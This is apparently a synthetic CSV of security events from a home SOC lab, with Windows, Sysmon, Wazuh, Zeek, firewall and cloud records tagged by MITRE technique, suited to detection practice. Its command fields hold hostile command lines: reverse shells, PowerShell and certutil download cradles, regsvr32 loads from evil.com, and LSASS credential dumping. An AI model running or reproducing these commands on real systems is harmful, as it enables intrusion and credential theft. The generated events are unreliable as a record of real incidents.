access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,KALI-LAB-01,489,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T17:56:37.661436,Hydra,lab.administrator,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,mshta.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T19:19:37.664940,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,172.16.0.100,,,,,,2026-04-23T22:06:37.660077,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T10:34:37.662874,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,4421,KALI-LAB-01,,Shadow copies deleted via vssadmin,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T01:49:37.667755,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-21T12:47:37.660211,,jane.smith,,,
,,,172.16.0.100,WIN-DC-PRAHARSH,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T07:49:37.669342,,,,Suspicious process spawned,40101
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,cmd.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-23T10:17:37.664131,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,4148,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T15:04:37.663265,,praharsh.admin,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T22:18:37.664546,,temp.analyst,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,DEV-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T03:49:37.664528,,attacker,,,
,,,,,,KALI-LAB-01,367,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T11:33:37.661494,Hydra,lab.administrator,,,
,,,,,,,,5294027,,,,,evil-c2[.]com,,91.234.56.78,9001,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T16:11:37.666500,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,ELK-SERVER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.102,,,,,,2026-04-20T18:46:37.660898,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-19T20:07:37.659576,,john.doe,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-Kali-Attacker,,,,Low,,,,,185.220.101.45,,,,,,2026-04-22T10:14:37.668675,,,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,e10adc3949ba59abbe56e057f20f883e,C:\Windows\Temp\payload.dll,,WAZUH-MANAGER-01,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T15:50:37.667276,,,,,
,,,,,,,199,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T18:20:37.661767,Hydra / CrackMapExec,finance.user,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,2462,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T23:23:37.663367,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,ZXhmaWw.cobalt-beacon[.]onion,,,DNS Tunneling Detected,,,,,ELK-SERVER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,981,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-21T12:40:37.666750,,,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Users\Public\payload.dll,,,,,Sysmon,,,,,T1055.001,,,,regsvr32.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-24T09:54:37.663821,,,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T16:06:37.664417,Metasploit / Netcat,attacker,,,
,,,,,,,196,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T19:17:37.662512,Hydra,admin,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T04:12:37.664668,,jane.smith,,,
,,,,,,,,5221068,,,,,evil-c2[.]com,,194.165.16.11,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T20:36:37.666362,,,,,
,,,,,,,,,,,,regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,msiexec.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T06:49:37.664909,,svc.backup,,,
,,,172.16.0.100,KALI-LAB-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T01:59:37.669485,,,,Suspicious process spawned,100002
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T19:39:37.663905,,attacker,,,
,,,,,,,,,,,,powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1'),,,192.168.56.104,9001,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T22:55:37.664377,Metasploit / Netcat,praharsh.admin,,,
,,,,,,,,,,,,,,,103.45.78.21,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,certutil.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-24T00:35:37.663683,,jane.smith,,,
,,,,,,,258,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T06:44:37.662477,Hydra,ubuntu,,,
,,,,,,,,1007706,,,,,evil-c2[.]com,,192.168.56.104,9001,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T15:32:37.666482,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-22T10:17:37.660556,,lab.administrator,,,
,,,,,,,,,,,,,,,,,aGVsbG8.mimikatz-payload[.]ru,,,DNS Tunneling Detected,,,,,KALI-LAB-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,869,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-21T12:22:37.666557,,,,,
,,,,,,,110,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T01:09:37.662301,Hydra / CrackMapExec,john.doe,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,DEV-SERVER-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,certutil.exe,,,svchost.exe,,2026-04-20T21:51:37.667664,,,,,
,,,,,,,,,,,,cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T12:53:37.664227,Metasploit / Netcat,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-20T18:38:37.661201,,attacker,,,
,,,,,,,389,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T08:11:37.662685,Hydra,admin,,,
,AttachAdminPolicy,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-20T13:08:37.667949,,temp.analyst,,,
,,,,,,,,,,,,,,,103.45.78.21,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,SURICATA HTTP Reverse Shell Detected,2827440,,,192.168.56.101,,,,,,2026-04-24T07:17:37.668720,,,,,
,,,,,,,,,,,,regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,bitsadmin.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T23:41:37.664975,,lab.administrator,,,
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,ELK-SERVER-01,192.168.56.105,,,,,,2026-04-23T04:11:37.665419,,finance.user,,,
,,,,,,,,,,,powershell.exe -enc SQBFAFgA,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T01:06:37.664704,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,bitsadmin.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-21T09:16:37.664012,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,SPLUNK-VM-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-PRAHARSH-01,172.16.0.100,,,,,,2026-04-21T21:54:37.665529,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-22T11:57:37.660740,,finance.user,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-SMB,,,,Low,,,,,185.220.101.45,,,,,,2026-04-22T06:25:37.668205,,,,,
,,,,,,,,,,,,powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1'),,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T16:43:37.664333,Metasploit / Netcat,temp.analyst,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-19T22:23:37.667151,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,bitsadmin.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-22T15:38:37.664144,,,C:\Windows\Temp\backdoor.exe,,
,,,192.168.56.105,SPLUNK-VM-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-21T19:13:37.669411,,,,Privilege escalation detected,100002
,,,,,,,,,,,,certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\Windows\Temp\mal.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T14:45:37.664992,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Users\Public\shell.ps1,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,certutil.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T13:56:37.663922,,john.doe,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,6213,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T07:41:37.663349,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-21T01:11:37.659559,,attacker,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,WIN-PRAHARSH-01,,,DLL Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,certutil.exe,,,svchost.exe,,2026-04-24T14:58:37.667626,,,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,powershell.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-24T14:52:37.664112,,,powershell -enc AAAA,,
,,,,,,,,,,,,,,,103.45.78.21,443,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,cscript.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-20T20:28:37.663527,,attacker,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.101,,,,,,2026-04-23T21:15:37.660759,,praharsh.admin,,,
,AttachAdminPolicy,,,,,,,,,Azure,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-21T19:17:37.667814,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,77.73.133.84,,,,,,2026-04-22T20:14:37.660496,,svc.backup,,,
,,,,,,,,,,,,,,,,,YmFzZTY0.malware-drop[.]net,,,DNS Tunneling Detected,,,,,KALI-LAB-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,184,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-24T05:12:37.666620,,,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,KALI-LAB-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,regsvr32.exe,,,explorer.exe,,2026-04-22T12:45:37.667653,,,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,SPLUNK-VM-01,10.0.2.10,,,,,,2026-04-19T22:37:37.665472,,jane.smith,,,
,,,,,document.docm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,svc.backup@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,ACTION REQUIRED: Verify your identity,,,,2026-04-22T08:13:37.669047,,,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Users\Public\shell.ps1,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,cscript.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T05:14:37.663839,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,45.67.22.10,,,,,,2026-04-21T00:32:37.660481,,john.doe,,,
,,,,,,,,,389733039,,,,,,185.220.101.45,,,,,Data Exfiltration Suspected,,,,,WIN-PRAHARSH-01,,,,,,Firewall,,,,,T1048,,,,,,HTTPS,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T14:18:37.666869,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.splunk,High,,,,,,,,,,,2026-04-20T09:50:37.662724,,praharsh.admin,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T22:39:37.664390,Metasploit / Netcat,dev.engineer,,,
,,,,,,KALI-LAB-01,441,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T14:10:37.661451,Hydra,lab.administrator,,,
,,,,,,,,,434492494,,,,,,91.234.56.78,,,,,Data Exfiltration Suspected,,,,,WAZUH-MANAGER-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T04:35:37.666874,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,wmic.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-22T00:40:37.664073,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T20:37:37.663205,,temp.analyst,,,
,,,,,,,,,,,,regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T17:37:37.664949,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,23.129.64.100,,,,,,2026-04-24T03:07:37.659756,,john.doe,,,
,,,,,,,,,,,,certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\Windows\Temp\mal.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,msiexec.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T11:50:37.664811,,attacker,,,
,,,,,,,340,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T17:42:37.662595,Hydra,root,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,10255,KALI-LAB-01,,Shadow copies deleted via vssadmin,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T15:01:37.667759,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,77.73.133.84,,,,,,2026-04-22T03:42:37.668638,,,,,
,,,,,,,200,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T14:19:37.662250,Hydra / CrackMapExec,dev.engineer,,,
,,,,,,,,,,,powershell.exe -ep bypass -file C:\shell.ps1,,,,,,,,4104,PowerShell Execution,,,,,SPLUNK-VM-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T06:29:37.664691,,john.doe,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,194.165.16.11,,,,,,2026-04-20T11:14:37.668268,,,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,7529,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T08:29:37.663233,,praharsh.admin,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,3576,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T07:53:37.663381,,praharsh.admin,,,
,,,,,,,189,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T12:41:37.662332,Hydra / CrackMapExec,lab.administrator,,,
,,,,,,,,,,,,,,,77.73.133.84,8080,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,cmd.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-24T01:03:37.663577,,svc.splunk,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,91.234.56.78,,,,,,2026-04-21T22:31:37.668472,,,,,
,,,,,,,314,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T00:17:37.662528,Hydra,splunk,,,
,CreateAccessKey,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-19T16:29:37.667877,,temp.analyst,,,
,,,,,,KALI-LAB-01,222,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T20:07:37.661337,Hydra,lab.administrator,,,
